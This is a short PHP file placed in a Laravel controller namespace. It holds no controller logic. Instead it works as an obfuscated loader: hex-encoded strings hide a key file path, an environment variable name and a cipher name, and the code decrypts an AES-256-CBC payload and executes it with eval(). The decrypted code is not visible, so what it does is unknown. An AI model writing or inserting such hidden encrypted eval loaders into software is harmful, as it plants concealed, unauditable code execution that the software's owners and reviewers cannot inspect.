<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AE8FQP23Gi+9hPf0a6MokQ==');

$c=base64_decode(

'mr/wvo24MrPe0GXJ+Hb+ceXVLK0tQMXn3QxKe6HCNawi2onsORUnzZtp+z0wHhoY5YA9epG8pXcl' .
'aYo5Lb41Znl57hMlpDBtmKzb4sQc+csvW6AfSuIlq4AIK7oUvU+1p/o2AKaGDytQb/gXI9M0QKad' .
'FHDO7sPNhA3ty+dPoDg1aSZSraCNYMxCy8evxCfoquVV+I5roqUKT3Ahsxl4BpwIsyAyt0GoN8/K' .
'jkxdd1dIAeKLojSHCWfd76V9tAev'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

